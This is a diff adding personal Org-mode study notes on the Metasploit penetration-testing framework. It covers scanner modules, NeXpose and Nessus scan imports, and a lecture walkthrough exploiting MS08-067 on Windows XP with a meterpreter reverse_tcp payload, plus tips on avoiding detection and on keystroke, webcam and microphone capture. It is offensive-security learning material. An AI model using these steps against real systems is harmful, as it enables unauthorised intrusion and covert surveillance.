@@ -1,10 +1,155 @@
 #+TAGS: sec_o
 
 
-* metasploit
+* Metasploit							      :sec_o:
+GitHub: [[https://github.com/rapid7/metasploit-framework][github.com/rapid7/metaspoit-framework]]
+* Cmds
+[[file://home/crito/org/tech/cmds/msfconsole.org][msfconsole]]
+[[file://home/crito/org/tech/cmds/msfvenom.org][msfvenom]]
+* Scanners
+mssql_ping - this scanner can be used to determine the tcp port and other details about a running MSSQL
+smb_version - this will let you know if a machine has samba running and provide other machine information
+ssh_version - this will determine the daemon and ssh version
+ftp_version - this will version and fingerprint any running ftp server
+anonymous - this will check if the ftp server allows anonymous login
+snmp_enum - this will help in detection of devices that are using SNMP 
+snmp_login - will use a word list, attempting to login to the device
+
+
+* Related
+- Armitage
+- Cobalt Strike
 * Description
 * Usage
+** Vulnerability Scanners
+*** NeXpose
+- import scan
+#+BEGIN_SRC sh
+db_connect postgres:toor@127.0.0.1/msf3
+db_import /tmp/host_101.xml
+db_hosts -c address,svcs,vulns
+#+END_SRC
+
+- scan within msfconsole
+#+BEGIN_SRC sh
+db_connect postgres:toor@127.0.0.1/msf3
+load nexpose
+nexpose_connect dookie:s3cr3t@192.168.56.103
+nexpose_scan 192.168.56.101
+db_hosts -c address
+#+END_SRC
+Scanning from within the msfconsle whist convenient will produce a less complete scan
+
+*** Nessus
+- import scan
+#+BEGIN_SRC sh
+db_connect postgrs:toor@127.0.0.1/msf3
+db_import /tmp/nessus_report_Host_101
+#+END_SRC
+
+*** OpenVAS
+    
+*** Speciality Vuln Scanners
+vnc_none_auth - this will scan for VNC server configured without a password (rare as modern VNC servers require password for installation). Possible RealVNC4.1.1
+open_x11 - this searches a range of hosts for X11 servers that allow connection without authentication
+
+
 * Lecture
+** [[https://www.youtube.com/watch?v%3DadSQyRPpiBw][Getting Started with Meatasploit - Nathan Sweaney]]
++ Command Line Access
+  - msfconsole
+  - msfvenom
+- msfpayload, msfencode, msfcli have deprecated to msfvenom
+
++ Terminology
+  - Modules
+    - Exoplits - take advantage of vulnerability
+    - Payloads - does something on the target sys
+    - Encoders - bypass av and ids
+    - Auxiliary - scanners that aid in discover of certain systems
+    - Post - information gathering modules
+  - Meterpreter 
+    - advanced payload that runs in memory on the target
+  - Plugins
+    
++ The exploit
+  - Target - Unpatched Windows XP Machine
+  - Exploit - MS08-067 - MS Server Service Relative Path Stack corruption
+  - Payload - Meterpreter
+    
+- Finding a Module
+msf> search MS08-067
+This will ouput a description of the exploit with name, disclousure date, Rank, Description
+
+- Set the Module
+msf> use exploit/windows/smb/ms08_067_netapi
+
+- View options for module
+msf> show options
+This will show use the current settings for this module, and is exploit specific
+
+- View possible targets this exploit works on
+msf> show targets
+
+- Set the remote host
+msf> set RHOST 10.0.1.45
+
++ Payloads
+  - Singles - Simple, self-contained code
+    - example: add a user, execute a cmd
+  - Stagers - Setup a network connection
+    - Examples: TCP lictener on a port, Reverse TCP connection
+  - Stages - Advanced payloads sent via stager
+    - Examples: VNC server, command shell, Meterpreter
+
+- set payload
+> set payload windows/meterpreter/reverse_tcp
+never use the default ports, security aware targets maybe monitoring these ports
+
+- show options
+> show options
+this will now also set the options for the payload
+
+- to run the exploit
+> exploit
+
++ Meterpreter
+  - Tons of cmds
+    - help
+    - OS cmds (cd, ls, pwd, cat, mv, rm)
+    - Networking (arp, ifconfig, netstat, portfwd, route)
+    - upload/download
+    - Record keystrokes, screenshots, webcam, microphone
+  - Additional plugins
+    
+meterpreter> sysinfo - give overview of the system (not much provided win7 or newer)
+meterpreter> getpid - get the current pid of meterpreter
+meterpreter> migrate 624 - migrate to another process that is less detectable
+
++ Auxiliary Modules
+  - Sniffing
+  - Scanning
+  - Fuzzing
+
+- Examples
+  - tomcat_mgr_login
+  - dir_listing
+  - vnc_none_auth
+  - http_ntlm
+  - mssql_exec
+    
+- Non-Attack
+  - scanner/ssh/ssh_version
+  - scanner/mssql/mssql_login
+  - scanner/ipmi/ipmi_version
+  - scanner/http/http_version
+  - scanner/snmp/snmp_login
+
 * Tutorial
 * Books
+[[file://home/crito/Documents/Security/Metasploit/Metasploit-The_Penetration_Testers_Guide.pdf][Metasploit - The Penetration Tester's Guide]]
+[[file://home/crito/Documents/Security/Metasploit/Metasploit_Penetration_Testing_Cookbook_2e.pdf][Metasploit Penetration Testing Cookbook]]
+[[file://home/crito/Documents/Security/Metasploit/Metasploit_Toolkit_for_Penetration_Testing.pdf][Metasploit Toolkit for Penetration Testing]]
+[[file://home/crito/Documents/Security/Metasploit/Metasploit_Guide.pdf][Metasploit Guide]]
+
 * Links
